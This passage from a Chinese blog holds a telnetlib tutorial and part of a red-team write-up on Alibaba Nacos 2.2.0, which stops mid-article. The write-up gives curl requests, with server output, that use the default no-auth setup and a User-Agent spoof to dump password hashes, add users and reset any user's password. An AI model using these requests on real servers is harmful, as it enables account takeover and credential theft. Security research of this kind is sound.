-        <h1><span id="python-telnet模块说明">Python telnet模块说明</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41629756/article/details/102784236">三番鱼</a> 并作补充</p>
-</blockquote>
-<h2><span id="程序要点说明">程序要点说明</span></h2><blockquote>
-<p>python实现telnet客户端的六个关键问题及其答案是：<br>使用什么库实现telnet客户端—-telnetlib</p>
-</blockquote>
-<blockquote>
-<p>1.怎么连接主机—-两种方法，一种是在实例化时传入ip地址连接主机（tn &#x3D; telnetlib.Telnet(host_ip,port&#x3D;23)），第二种是，先不传参数进行实例化再用open方法连接主机（我这里使用的方法）</p>
-</blockquote>
-<blockquote>
-<p>2.怎么输入用户名密码—-我们使用read_untilb函数监听，出现标志后使用write方法向服务端传输用户名密码</p>
-</blockquote>
-<blockquote>
-<p>3.怎么执行命令—-仍然是使用write方法向服务端传送命令，不管向服务端传送什么数据都用write；不过要注意需要编码成bytes类型<br>注：该Telnet.write()函数采用字节字符串。这可以通过仅编码字符串（您尝试编码函数的返回值）来提供，例如：</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.write(<span class="string">&quot;administrator\n&quot;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>或者通过为字符串添加前缀b如下：</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"> </span><br><span class="line">host = <span class="string">&quot;192.168.1.0&quot;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> telnetlib.Telnet(host, port, timeout) <span class="keyword">as</span> session:</span><br><span class="line">    session.write(<span class="string">b&quot;administrator\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;password\n&quot;</span>)</span><br><span class="line">    session.write(<span class="string">b&quot;reboot\n&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>4.怎么获取命令执行结果—-使用read_very_eager()方法，该方法获取的内容是上次获取之后本次获取之前的所有输入输出；由于获取到的是bytes类型要decode解码一下</p>
-</blockquote>
-<blockquote>
-<p>5.怎么退出telnet—退出telnet使用write方法向服务器提交exit命令即可</p>
-</blockquote>
-<h2><span id="程序源码清单">程序源码清单</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelnetClient</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,</span>):</span><br><span class="line">        self.tn = telnetlib.Telnet()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现telnet登录主机</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login_host</span>(<span class="params">self,host_ip,username,password</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># self.tn = telnetlib.Telnet(host_ip,port=23)</span></span><br><span class="line">            self.tn.<span class="built_in">open</span>(host_ip,port=<span class="number">23</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s网络连接失败&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 等待login出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;login: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(username.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 等待Password出现后输入用户名，最多等待10秒</span></span><br><span class="line">        self.tn.read_until(<span class="string">b&#x27;Password: &#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        self.tn.write(password.encode(<span class="string">&#x27;ascii&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 延时两秒再收取返回结果，给服务端足够响应时间</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取登录结果</span></span><br><span class="line">        <span class="comment"># read_very_eager()获取到的是的是上次获取之后本次获取之前的所有输出</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Login incorrect&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> command_result:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录成功&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.warning(<span class="string">&#x27;%s登录失败，用户名或密码错误&#x27;</span>%host_ip)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 此函数实现执行传过来的命令，并输出其执行结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_some_command</span>(<span class="params">self,command</span>):</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        self.tn.write(command.encode(<span class="string">&#x27;ascii&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 获取命令结果</span></span><br><span class="line">        command_result = self.tn.read_very_eager().decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        logging.warning(<span class="string">&#x27;命令执行结果：\n%s&#x27;</span> % command_result)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 退出telnet</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">logout_host</span>(<span class="params">self</span>):</span><br><span class="line">        self.tn.write(<span class="string">b&quot;exit\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    host_ip = <span class="string">&#x27;192.168.220.129&#x27;</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;abcd1234&#x27;</span></span><br><span class="line">    command = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    telnet_client = TelnetClient()</span><br><span class="line">    <span class="comment"># 如果登录结果返加True，则执行命令，然后退出</span></span><br><span class="line">    <span class="keyword">if</span> telnet_client.login_host(host_ip,username,password):</span><br><span class="line">        telnet_client.execute_some_command(command)</span><br><span class="line">        telnet_client.logout_host()</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>python 库 telnetlib: Telnet客户端:<br>telnetlib模块提供的Telnet类实现了Telnet协议。它为协议字符和telnet选项提供符号常量，符号常量来源于arpa&#x2F;telnet.h去掉了前缀TELOPT_</p>
-<p>1.Telnet.read_all(): 读取所有数据直到EOF，阻塞直到连接关闭<br>2.Telnet.read_some(): 读取至少一个字节的数据，除非EOF。如果没有数据则阻塞。<br>3.Telnet.read_until(expected[, timeout]):常用于登录，与write连用；读取直到遇到了给定的字符串expected或超时秒数<br>4.Telnet.read_very_eager(): 非阻塞地读取。连接关闭或者没有数据时触发EOFError异常，返回b’’如果没有数据。 获取命令执行结果：获取的内容是上次获取之后本次获取之前的所有输入输出<br>5.Telnet.read_eager(): 读取已有数据(快)<br>6.Telnet.read_lazy(): 读取已有数据(懒)<br>7.Telnet.read_sb_data(): 返回的SB&#x2F;SE pair(suboption begin&#x2F;end)之间的数据，此方法永远不会阻塞<br>8.Telnet.open(host[,port[,timeout]]): 连接到主机，可选的第二个参数是默认为标准的Telnet端口（23）的端口号。可选的超时参数（以秒指定）阻塞操作（如连接尝试超时（如果不指定，默认使用全局超时设置））<br>9.Telnet.msg(msg[, *args]): 当调试级别为&gt;0打印调试信息<br>10.Telnet.set_debuglevel(debuglevel)：设置调试级别。debuglevel越高信息越多。<br>11.Telnet.close() 关闭连接<br>12.Telnet.get_socket()：返回套接字供内部使用<br>13.Telnet.fileno(): 返回套接字对象内部使用的文件描述<br>14.Telnet.write(buffer): 常用于执行命令；写入字符串到套接字，加倍IAC的任何字符。连接关闭时可能触发OSError异常。<br>15.Telnet.interact(): 交由用户控制<br>16.Telnet.mt_interact(): 多线程版本的interact()<br>17.Telnet.expect(list[, timeout]): 读取直到匹配正则表达式项列表中的一个。list是一个正则表达式列表，包含编译(regx对象)或未编译（字节字符串）。timeout以秒为单位，默认值为无限期阻塞。返回元祖的三个项目：</p>
-<ul>
-<li>1.index为匹配正则表达式的位置；</li>
-<li>2.match对象</li>
-<li>3.此时读了的字节<br>18.Telnet.set_option_negotiation_callback(callback):每次从输入流读取telnet选项时，调用callback,后续步骤不会执行。</li>
-</ul>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Python/" rel="tag">Python</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Telnetlib/" rel="tag">Telnetlib</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/07/24/Nacos-AccessToken/">
-                云原生组件Nacos新型红队手法研究
-            </a>
-        </h2>
-    
-    <time>
-        Jul 24, 2023
-    </time>
-    <section class="content">
-        <h1><span id="云原生组件nacos新型红队手法研究">云原生组件Nacos新型红队手法研究</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ">Zhuri</a> 并作补充</p>
-</blockquote>
-<h2><span id="组件简介">组件简介</span></h2><blockquote>
-<p>Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p>
-</blockquote>
-<h2><span id="历史漏洞">历史漏洞</span></h2><blockquote>
-<p>2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。<br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a><br>在Nacos 2.0版本存在未授权访问漏洞，程序未有效对于用户权限进行判断，导致能够添加任意用户、修改任意用户密码等等问题。<br>这里就不做过多介绍了，网上有很多。<br>就在我撰写本文的时候，官方刚刚发布了最新的版本2.2.0 (Dec 14, 2022)，我们就来一探究竟。</p>
-</blockquote>
-<h2><span id="部署方式">部署方式</span></h2><blockquote>
-<p>为了方便起见，我这里使用Debian系统并采用的单机部署的方式。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install default-jdk</span><br><span class="line">sudo ufw <span class="built_in">disable</span></span><br><span class="line">wget https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.zip</span><br><span class="line">unzip nacos-server-2.2.0.zip</span><br><span class="line"><span class="built_in">cd</span> nacos/bin</span><br><span class="line">bash startup.sh -m standalone</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>然后访问<a target="_blank" rel="noopener" href="http://ip:8848/nacos%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%87%BA%E7%8E%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%B0%B1%E8%AF%B4%E6%98%8E%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%B8%BAnacos/nacos%E3%80%82">http://ip:8848/nacos，如果出现登录界面，就说明部署成功了，默认的账号密码为nacos/nacos。</a></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>我们首先尝试使用老版本的payload尝试能不能打。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>不出意外，返回:</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caused: Parameter conditions <span class="string">&quot;search=blur&quot;</span> OR <span class="string">&quot;search=accurate&quot;</span> not met <span class="keyword">for</span> actual request parameters: pageNo=&#123;1&#125;, pageSize=&#123;9&#125;;%</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们仔细看一下报错，提示说是缺少search&#x3D;blur或者search&#x3D;accurate，那我们加上再试试看。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/07/24/Nacos-AccessToken/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>这就成功了？<br>我一开始以为没修，后来发现，我通过查看鉴权相关文档时(<a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html)%EF%BC%8C%E5%AE%83%E5%8F%AA%E6%8F%8F%E8%BF%B0%E4%BA%86%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%E7%9A%84%E5%90%8E%E6%9E%9C%EF%BC%8C%E4%BD%86%E6%98%AF%E9%BB%98%E8%AE%A4%E5%90%AF%E5%8A%A8%E5%8D%B4%E4%B8%8D%E5%BC%80%E9%89%B4%E6%9D%83%E7%9A%84%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%A0%B9%E6%8D%AEgithub%E7%9A%84issue%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E6%96%B9%E5%B9%B6%E4%B8%8D%E8%AE%A4%E4%B8%BA%E8%BF%99%E6%98%AF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E8%87%B3%E4%BA%8E%E7%BD%91%E4%B8%8A%E5%87%BA%E4%BA%86%E4%B9%8B%E5%89%8D%E7%94%B1%E4%BA%8E%E4%B8%8D%E5%BD%93%E5%A4%84%E7%90%86User-Agent%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%90%8E%E4%BA%BA%E5%B0%91%E6%9C%89%E6%8C%96%E6%8E%98%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%BD%91%E4%B8%8A%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E4%B9%9F%E5%9F%BA%E6%9C%AC%E4%B8%8A%E5%81%9C%E7%95%99%E5%9C%A8%E9%82%A3%E6%AC%A1CVE%E3%80%82">https://nacos.io/en-us/docs/auth.html)，它只描述了如何开启鉴权，以及不开启鉴权的后果，但是默认启动却不开鉴权的，并且根据github的issue来看，官方并不认为这是漏洞，以至于网上出了之前由于不当处理User-Agent导致的未授权访问漏洞之后，后人少有挖掘其利用方式，网上的相关资料也基本上停留在那次CVE。</a></p>
-</blockquote>
-<h2><span id="未开启auth">未开启auth</span></h2><blockquote>
-<p>由于默认是不开auth的，所以我们先来讨论未开启auth的情况。</p>
-</blockquote>
-<h3><span id="读取用户账号密码">读取用户账号密码</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;totalCount&quot;</span>:1,<span class="string">&quot;pageNumber&quot;</span>:1,<span class="string">&quot;pagesAvailable&quot;</span>:1,<span class="string">&quot;pageItems&quot;</span>:[&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;$2a$10<span class="variable">$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu</span>&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
-
-<h3><span id="未授权添加用户">未授权添加用户</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?username=test1&amp;password=test1&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:200,<span class="string">&quot;message&quot;</span>:null,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;create user ok!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<h3><span id="任意用户密码更改">任意用户密码更改</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?accessToken=&#x27;</span> -H <span class="string">&#x27;User-Agent:Nacos-Server&#x27;</span> -d <span class="string">&#x27;username=test1&amp;newPassword=test2&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>基本上目前主流针对Nacos的利用手法就停留在这里了，以至于防守方会通过WAF规则的形式来拦截掉这几个url请求。<br>但是根据代码审计以及官方的api接口文档，我们还能找到许多可以利用的接口，官方文档里面有的，我就不说了，大家自己可以去OpenAPI（<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/open-api.html%EF%BC%89%E8%87%AA%E8%A1%8C%E6%9F%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E7%BD%91%E9%87%8C%E9%9D%A2%E7%9A%84OpenAPI%E6%89%80%E7%BB%99%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%B7%E5%80%BC%E5%B9%B6%E4%B8%8D%E6%98%AF%E5%BE%88%E9%AB%98%E3%80%82">https://nacos.io/zh-cn/docs/open-api.html）自行查看，官网里面的OpenAPI所给出的利用价值并不是很高。</a></p>
-</blockquote>
-<h3><span id="代码审计">代码审计</span></h3><blockquote>
-<p>下载源码后通过简单查找发现在<code>nacos/config/src/main/java/com/alibaba/nacos/config/server/constant/Constants.java</code>和<code>nacos/core/src/main/java/com/alibaba/nacos/core/utils/Commons.java</code>文件下，有相关路由的定义，相关代码如下：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v1/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_V2_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v2/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OPS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/ops&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CAPACITY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/capacity&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COMMUNICATION_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/communication&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/configs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/config&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HEALTH_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/health&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LISTENER_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/listener&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NAMESPACE_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/namespaces&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">METRICS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/metrics&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Commons</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_CONTEXT</span> <span class="operator">=</span> <span class="string">&quot;/nacos&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION</span> <span class="operator">=</span> <span class="string">&quot;/v1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION_V2</span> <span class="operator">=</span> <span class="string">&quot;/v2&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_NACOS_CORE_CONTEXT</span> <span class="operator">=</span> NACOS_SERVER_VERSION + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT</span> <span class="operator">=</span> DEFAULT_NACOS_CORE_CONTEXT;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT_V2</span> <span class="operator">=</span> NACOS_SERVER_VERSION_V2 + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>我们可以看到有V1、V2两种API接口，我们根据不同类型再具体分析。</p>
-</blockquote>
-<h3><span id="获取配置数据">获取配置数据</span></h3><blockquote>
-<p>根据官方OpenAPI的说明，你需要知道dataId与group的值，才能读取到对应的配置文件，如果留空或者不填，则会无法读取。</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>事实真的是这样吗？<br>我们看一下<code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code>文件中369行开始的代码。</p>
-</blockquote>
